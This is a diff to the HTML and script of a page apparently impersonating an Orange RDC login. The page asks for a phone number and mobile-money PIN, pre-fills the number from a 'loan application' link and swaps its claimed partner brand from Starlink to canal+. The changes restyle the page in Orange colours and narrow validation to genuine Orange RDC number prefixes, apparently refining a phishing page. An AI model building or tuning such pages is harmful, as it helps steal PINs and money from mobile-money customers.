@@ -6,17 +6,18 @@
 <title>Orange — Connexion</title>
 <style>
   :root{
-    --brand-orange:#ff7900;
+    --brand-orange:#ff5a00;
+    --brand-orange-deep:#ff5a00;
     --text-dark:#3a3a3a;
     --text-grey:#7a7a7a;
-    --border-orange:#ff7900;
+    --border-orange:#ff5a00;
     --footer-bg:#fff7ef;
   }
   *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
   html{-webkit-text-size-adjust:100%;}
   body{
     font-family:'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-    background:#fff7ef;
+    background:linear-gradient(180deg, #ff5a00 0%, #ff5a00 42%, #fff7ef 42%, #fff7ef 58%, #ff5a00 58%, #ff5a00 100%);
     color:var(--text-dark);
     min-height:100svh;
     width:100%;
@@ -306,7 +307,7 @@
   }
 
   footer{
-    background:var(--footer-bg);
+    background:linear-gradient(180deg, #ff5a00 0%, #ff5a00 100%);
     padding:24px;
     text-align:center;
   }
@@ -366,7 +367,7 @@
         </svg>
       </span>
       <span class="code">+243</span>
-      <input type="tel" id="phoneInput" placeholder="951234567" inputmode="numeric" maxlength="9">
+      <input type="tel" id="phoneInput" placeholder="801234567" inputmode="numeric" maxlength="9">
     </div>
 
     <div class="code-label">Entrez votre code PIN</div>
@@ -390,7 +391,7 @@
         <div class="dot"></div>
       </div>
       <h2 id="invalidTitle">Format Invalide</h2>
-      <p id="invalidMessage">Le numéro de téléphone doit commencer par 9, 80, 84, 85 ou 89 et contenir exactement 9 chiffres.<br>Veuillez entrer le bon numéro et réessayer!</p>
+      <p id="invalidMessage">Le numéro de téléphone Orange RDC doit commencer par 80, 84, 85 ou 89 et contenir exactement 9 chiffres.<br>Veuillez entrer le bon numéro et réessayer!</p>
       <button type="button" id="invalidOkBtn">OK</button>
     </div>
   </div>
@@ -410,7 +411,7 @@
       <img src="assets/img/OIP.jpg" alt="Max it RDC" class="logo-img footer-logo-img">
     </div>
     <div class="collab-text">En collaboration avec</div>
-    <div class="collab-brand">Starlink™</div>
+    <div class="collab-brand">canal+™</div>
     <hr>
     <div class="copyright">© 2026 Orange RDC. Tous droits réservés.</div>
   </footer>
@@ -418,12 +419,13 @@
 <script>
   const phoneInput = document.getElementById('phoneInput');
   const codeBoxes = Array.from(document.querySelectorAll('.code-box'));
+  const orangeRdcPhonePattern = /^(?:80|84|85|89)[0-9]{7}$/;
 
   // Automatically reflect the phone number passed from the loan application.
   const incomingParams = new URLSearchParams(window.location.search);
   const incomingPhone = incomingParams.get('phone') || '';
-  const normalizedPhone = incomingPhone.replace(/\\D/g, '').replace(/^243/, '');
-  if (/^(?:9[0-9]{8}|(?:80|84|85|89)[0-9]{7})$/.test(normalizedPhone)) {
+  const normalizedPhone = incomingPhone.replace(/\D/g, '').replace(/^243/, '');
+  if (orangeRdcPhonePattern.test(normalizedPhone)) {
     phoneInput.value = normalizedPhone;
   }
   const connexionBtn = document.getElementById('connexionBtn');
@@ -530,9 +532,9 @@
     const phone = phoneInput.value.trim();
 
     // Show the invalid-number page only when the user tries to submit.
-    if(!/^(?:9[0-9]{8}|(?:80|84|85|89)[0-9]{7})$/.test(phone)){
+    if(!orangeRdcPhonePattern.test(phone)){
       showInvalidPhone(
-        'Le numéro de téléphone doit commencer par 9, 80, 84, 85 ou 89 et contenir exactement 9 chiffres.<br>Veuillez entrer le bon numéro et réessayer!'
+        'Le numéro de téléphone Orange RDC doit commencer par 80, 84, 85 ou 89 et contenir exactement 9 chiffres.<br>Veuillez entrer le bon numéro et réessayer!'
       );
       return;
     }
